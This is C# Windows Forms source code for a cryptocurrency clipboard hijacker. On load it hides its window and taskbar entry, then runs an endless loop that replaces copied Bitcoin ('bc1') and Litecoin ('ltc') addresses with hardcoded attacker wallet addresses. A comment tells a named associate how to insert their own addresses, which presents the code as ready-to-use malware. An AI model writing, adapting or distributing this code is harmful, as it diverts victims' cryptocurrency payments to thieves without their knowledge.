using System;
using System.Threading;
using System.Windows.Forms;
using System;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Text;
using System.Diagnostics.Eventing.Reader;

namespace WinFormsApp2
{
    public partial class Form1 : Form
    {



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.None;
            Thread TM = new Thread(Clipboard_Check);
            TM.SetApartmentState(ApartmentState.STA);
            CheckForIllegalCrossThreadCalls = false;
            TM.Start();
        }




        void Clipboard_Check()
        {
            while (true)
            {
                try
                {
                    var text = Clipboard.GetText();
                    //for my guy JP, if you would like to add your own addresses, change the lines underneath :)
                    if (text.StartsWith("bc1"))
                    {
                        Clipboard.SetText("bc1q7ycz2f67g69u9pw3h84x30jtjhhwqr4us7gzy4");
                        Thread.Sleep(5000);
                    }
                    else if (text.StartsWith("ltc"))
                    {
                        Clipboard.SetText("LXWnV32PZFunP6Ui1RqwdwRbcV8aNqewnA");
                        Thread.Sleep(1000);
                    }
                }
                catch (System.Runtime.InteropServices.ExternalException ex)
                {
                    // Handle clipboard access errors
                    Console.WriteLine("Clipboard access error: " + ex.Message);
                    //delay before trying to loop again
                    Thread.Sleep(1000); 
                }


            }

        }
    }
}
